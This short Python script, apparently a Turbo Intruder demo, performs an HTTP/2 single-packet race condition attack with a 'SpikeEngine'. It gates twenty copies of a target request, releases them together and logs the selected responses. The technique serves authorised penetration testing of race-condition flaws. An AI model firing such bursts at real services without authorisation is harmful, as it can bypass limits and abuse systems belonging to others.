# Demo: HTTP/2 single-packet race condition attack using SpikeEngine.
# Uses small-frame mode (default) to split HEADERS and DATA frames,
# sending all final DATA frames simultaneously for precise timing.
CONCURRENT_CONNECTIONS = 1
REQUESTS_PER_CONNECTION = 100
RACE_GATE_NAME = "spike-race"
RACE_REQUEST_COUNT = 20
COMPLETE_TIMEOUT_SECONDS = 30
KEEP_STATUS_CODES = [200, 201, 202, 302, 409, 429, 500]


def queue_requests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrent_connections=CONCURRENT_CONNECTIONS,
        requests_per_connection=REQUESTS_PER_CONNECTION,
        engine=Engine.SPIKE,
        warm_local_connection=True,
        fat_packet=False,
    )

    for i in range(RACE_REQUEST_COUNT):
        engine.queue(target.req, str(i), gate=RACE_GATE_NAME, label="spike-race")

    engine.open_gate(RACE_GATE_NAME)
    engine.complete(COMPLETE_TIMEOUT_SECONDS)


def handle_response(req, interesting):
    if req.status in KEEP_STATUS_CODES:
        table.add(req)
